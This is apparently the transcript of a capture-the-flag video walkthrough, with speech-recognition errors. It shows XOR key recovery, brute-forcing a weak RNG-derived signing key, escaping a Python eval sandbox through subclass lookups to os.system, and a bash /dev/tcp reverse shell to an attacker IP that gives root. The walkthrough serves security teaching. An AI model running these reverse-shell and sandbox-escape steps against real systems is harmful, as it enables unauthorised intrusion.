then we'll have the X or phrase to this entire file so let's do ki is equal to ki times five and before we do that we actually have to do the XOR so ki is equal to bytes X to the Y and this I said to that but that is the XOR operation for X comma Y in zip plain text ciphertext okay close that entire thing out and now ki times five so now the key should be the same way as the ciphertext as long as I can spell correctly or longer that's fine it doesn't have to be the same exact length we'll see who knows it's crypto let's see now we need to decrypt so decrypted is equal to pretty much the same thing we just did by its X X or Y for X Y and zip and instead of doing plaintext we do key cipher texts actually let's do ciphertext key and we can swap that around after this so you can see why I did that print decrypted and let's hope it works there we go so it looks like we have it if we want to make this pretty we can dot what is it encode utf-8 dot our strip decode and we can see it as a string so because the username decrypted correctly I'm assuming everything else decrypted well as well and seeing that space slash is really good so if I had done key first let's see what happens I'm going to assume we'll get the password and then a bunch of junk so python 3 know the same thing so zip will stop once one of the streams is done or maybe this is the same and there's just more ASCII bytes let's say for something real quick print key execute this WC - C 119 we don't want to WC yeah xxd so it ends mid 70 that's fine so instead of key we can do print ciphertext see how long this is so yeah he is definitely much longer but that is all fine we had it correct so see that should be good so we'll copy the new password put it into cherry tree and type it out so our I J and a L password and then we could go back to the web application but we already have complete access to that the next logical step is SSH since we can log-in 10 10 10 and then 129 and we need the username so rij and dei oh if I didn't have SSH I would just do it in this netcat session with su but because I have s as each might as well use it because it's going to handle a lot of things for me so now we are the user we can read user dot text can we read that before no we couldn't so we can read that and we can also go into this cryptos directories if we look at the contents of this it is just one Python file which is relatively big so we'll have to figure out what to do with this in order to read the code better I'm just gonna open up in vim so we have syntax highlighting the first thing we see are a bunch of import statements the most notable ones right now or bottle which is a micro web framework for python much like flask or django but Django's not microbe but looking at the very bottom we can see bottle runs on the interface one 27001 on port 81 so because it's on localhost that's why we didn't see it in and map but it is indeed there we could get out of this and then do a curl on localhost 81 to verify yes there is a web server so going back to the code after fighting outs a web server the first function we see is secure RNG which is a random function it says it's taken from the internet and probably secure but we probably want to test that and the quickest way to test any random function is just to run it a buttload of times and see if it outputs duplicates so let's do that I'm going to do base64 - w0 to put the output all on one line and we're going to copy this to a local workstation just because it's easier to work with so copy all of this and then go to a workstation let's make the RND and then we'll create the source pipe b64 paste it base64 - d and then direct it to source top pi there we go awesome so let's do generate that pi and remove what we don't need so in order to run the random function we don't need any of this web server crap so let's get rid of that we need the secure RNG function of course and then we just need up to the point where it generates the key and that looks like it's right here we have seed is equal to random get ran bits 128 and then R and equals secure rng seed plus 1 so everything after this we're just going to wipe out and we can run this multiple times by doing 4i and range zero to nine thousand one highlight these two indent and all we want to do is print R and we can do Python 3 generate PI and we can see it outputting so let's just drag that to the file output and if you get like a Python arrow you may not have the ECDSA library installed in that case just do pip3 install ECDSA taken quite a while to run I thought it would generate that quicker CC - shell output for above 2000 sometimes you don't need go over 9001 so let's test this out if we do WCHL on output we have supposedly around 2600 random numbers if we can't output we can see that and we can see the upper limit is a pretty big digit like if I told you I'm taking a random number between 0 and whatever number this is and I'm gonna write 2,000 times if it's random we're not gonna get any repeats so let's test this theory out let's do sort - you output to only show unique values WC - L and we get 209 unique values that is completely different than the 2600 in this so over 10% of the time it is duplicating the key which means this isn't really random I'm just going to move not move we'll do this sort - you - T and then move T over output because I don't need any of those duplicates I just want everything unique so let's go and keep analyzing this exactly how does it use this random here we're creating the signing key variable that's not needed we get a function to verify in sign not really - interesting this is the route to slash or like index.html or whatever so if you just hit slash you're just gonna get this response which is what we saw we got slash eval and emails interesting because eval generally means execute code so we're looking at this built-ins are remove moved so this looks like a way to try to safely use evil but there are no safe ways to ever use evil there's a bunch of creative ways around that so if we ever get to this part in the code we'll figure a way around there protection against using evil never give user input evil it's always a horrible idea so in order to do this we need to create an expression sign the expression and then make a post request to slash eval going down here we have generated a sample expression and signature for debugging purposes so if we just curl localhost 81 slash debug you can see that output nothing too interesting so what we want to do is figure out a way to hit that eval function and the applications going to start up generate the seed and pick a random number and use that to generate the signing key as long as this is random it's fairly secure because you saw that huge number we'd have to brute-force to try to find a signing key for this however if we can send 1,000 requests to it and about 10% of time it's a duplicate chances are we're gonna figure out what the random function is so we're just going to brute force a bunch of numbers generated by the secure oranjee function and because it's not really random we'll just hit a collision the webserver isn't generating a new signing key for every request it just starts up then creates one for its entire session to restart the server so let's copy source to brute PI and because this looks like it's coded and Python - and that's why I'm not gonna use Python 3 because I want to really use as much code as possible because I am lazy we probably don't have to generate random numbers because well we have output file that has a list of all random numbers same with seed and Rand however we will need to create the signing key so this will be four line in open output dot read lines and then line is equal to line or a strip so that would be the output of that secure or ng since we already ran it and then those we probably don't need verify because all we're doing is signing messages we can move sign to the top let's see this route to slash we don't need route to eval we don't need we want to know that it is indeed that post request and we're gonna go up here import requests and now we will begin the route so we can do our is equal to request dot post the URL which is going to be HTTP let's do this from a Cali machine so to do that we'd have to set port forwarding I'm going to hit enter to do a new line then the squiggly that's left to the one and then capital C and that's going to go into this SSH prompt new dash l 81 localhost 81 and that's going to set up a SSH local port forward curl local host 81 we can see that's now going through SSH if you have trouble remembering that the way I did it first was just SSH Konami codes and you go to a post on sans org and this explains that whole thing so that's SH Konami code was easier for me to remember then all that hotkeys but once I do it a hundred times then I have it memorized so now we can request to one 27001 slash eval and then we need to send it data and it's not params because this is a post request so data is equal to and we need right here exp R and cig so these two lines these two ones is what I'm doing so data expr and we'll create the variable exp row at a minute and then sig and we'll create that variable in a minute so exp R is equal to 9,000 plus 1 and then sig is going to be equal to sine exp a so now we have both of those that request is done so now all we have to do is check if the response contains bad signature so if we do if add signature in our dot text none else print we want what is it assigning key and that will be sig and break after that I think that's right let's see what I have type out in massively screwed up so Python 3 brute PI probably need quote we're not doing base on 3 Python brute PI R and is not defined this is line and we have an error awesome so signing key what did we screw up eske it's equal to line is probably a string and we want it to be an integer and running it it dies immediately let's print our text and see how we screwed that up unsupported method post what HTTP 1 port 81 and we're just getting error now which is different let's see expression if we don't do this 9,000 plus 1 see print text Python brute so we got something going on that's not good let's do expression is equal to 9,000 plus 1 this way data data sig sig equals test see if this still errors I'd expect to see what is it bad signature so that's what I'm expecting and that's not what I'm getting let's do curl localhost 81 or indeed going there slash eval - capital X post error so let's do them maybe it needs let's go back em source top I go to eval request data is equal to request dot JSON that is the mistake it's not data it is JSON and the reason I went along troubleshooting that they sent a request when it gets data it doesn't expect it prints error we went back into the code we probably see yeah if it can't do anything here then it returns error so python brute bad signature now we are getting that so we can do uncomment this and just put none now when we execute Python brute we will be be brute PI there we go had too many print statements but now eventually when we hit it will get a valid signature and this will be the signing key for the web server which means we'll be able to sign anything we want so we can run this multiple times to validate it's correct and not changing so with this one finish and it's different that's not ideal let's do print text maybe we are like getting rate limited by the server actually we should always print text this will be a nun and this way would help to send the request module through book so you don't have to run this multiple times you could just look at the history and see what happens but I would expect this to hit multiple times but maybe signatures not what we want we may want what is it line so let's try this there we go try it one more time see if it hits on that same exact line there we go so now these two are definitely the same and we have nine thousand plus one and that phony uh troubleshooting I was doing concatenated two strings so it wasn't airing out because of the expression it was airing out because of how we sent it data so now this time it should say nine thousand one instead of ninety thousand one yep there we go so we can see we're definitely executing code and we have what we need to sign it so copy Brut to run code pi and we can get rid of this loop because we know what it is go everywhere and then delete that and we can just say line is equal to whoa let's copy this again line is equal to this and that should be good so if we do Python run code break outside of loop that's fine and every time we run this we get something so if we do expression is equal to some Python code I wonder if like print test Python error so now but one thing we could do is reference the OS module a little bit differently so if we go back to the server and go to Google and then just search for like Python evil code dangerous joltin and the very first link is a post that says eval is really dangerous and this explains a little of everything essentially it's just a different way to call it we're going to essentially do what's in that page so the first thing when do is Python and then we can call classes like this which is really bizarre looking but class dot base and each of these is two underscores and then subclasses and that so this will list everything that is loaded it's kind of like a DC ization attack we're trying to find a to code execution and then we look for the OS one and I don't see it so we can do four line in and then print line and OS it's not there it's weird PS we were in a different Python oh this is actually Python 3 whoops my assumption earlier who is wrong normally when something's Python 3 I'd see it like in this shebang up top so print statement or anything nope there isn't so this is actually running Python 3 so let's do the same thing we did with python 2 but with python 3 and see if there is an OS there so for i in class base and we have to do annoying double underscore subclasses like that and then print i and right here we have OS loaded so we could call OS by doing we have to get the number so let's do count is equal to 0 do the same exact thing print count okay then count plus equals 1 so we're going to increment count and now we can print the index number so if we look at oh s it is loaded at 117 so if we go back here we can do this dot class subclasses dot get item 117 and then initialize Global's and it's OS dot system that we want to run and let's execute Who am I and we can see we execute it and we are this user so this is a different way to run import OS and then OS dot system so if we copy this go over to a run code and then we're going to set expression to that and we'll do bash see then single quote oh let's try triple cork there so now bash - see then single quote bash - I dove TCP 10 10 14 3 9001 0 & 1 and then we can do single double and close out of them both so that should work if we can't run code we could also run this individually to make sure it works so NC l VMP 9001 go to that sage tab execute this go back to a netcat session and we have river shell however that's only running as the user we are so now let's do NC o VMP 9001 and execute our script so this was run code and there we go we are now root at crypt dose so we can go into slash root and WC - C root ext and we get it we look at krypter stop i it should be the same exact thing we saw secure rng yep same thing same script so that is the box hope you guys enjoyed it but before I end this video there is one last thing I want to show and that's way near the beginning back at this file encrypt or XOR page so if you remember we had we submit a page so this is gonna be unknown page we don't know the source code of this page just what we want it gets XOR with some rc4 key and then we get the blob and the only thing we see in this equation is the blob and we know this unknown page is gonna be the same every time we do it because it's a URL so we don't know rc4 key we don't know the blob so what we did was we gave it a known plaintext and then did the rc4 key and then got blob well we'll call this cipher I guess and then what we did was took the unknown page ex-ored it with the cipher we just got and we got the source code of the page so well maybe we should put blob here so we took the blob from here took the cipher from the plaintext and got the source code if you're following the logic of this whole thing there's no reason why we couldn't of just taken this and then put the blob here had the page X work with that rc4 key and then we would have got the source code so we can test that and the reason why I didn't show that is mainly because in most scenarios when this type of encryption is used it's used in a stream that you can't really replay or things like that so think of this like you have a PDF that got encrypted this way well you're not going to be able to resubmit the entire PDF you'll just have like a forensic image or something but you have the magic bytes of most PDFs you know how they begin so you can begin reading reconstructing it so that's why I showed the more complicated way this will be the extremely easy way so we're gonna do is go into dub dub dub and we're going to call this unknown dot txt I guess and then this content will be please support me on patreon so if we go back to this file in crypto service go to our c4 and do HTTP 10 10 14 3 unknown dot txt it's going to reach out to a web server and encrypt this so if we do base64 echo - n base64 - D we can see this is that encrypted content so let's just put this - unknown dot blob and now we're gonna go back to the web server and we're going to take our C for HTTP 10 10 14 3 unknown blob and click encrypt and we should get back the please support me on patreon so this is just a different way to do that so now that that's done I'm gonna end the video I hope you guys enjoyed it take care and I will see you all next week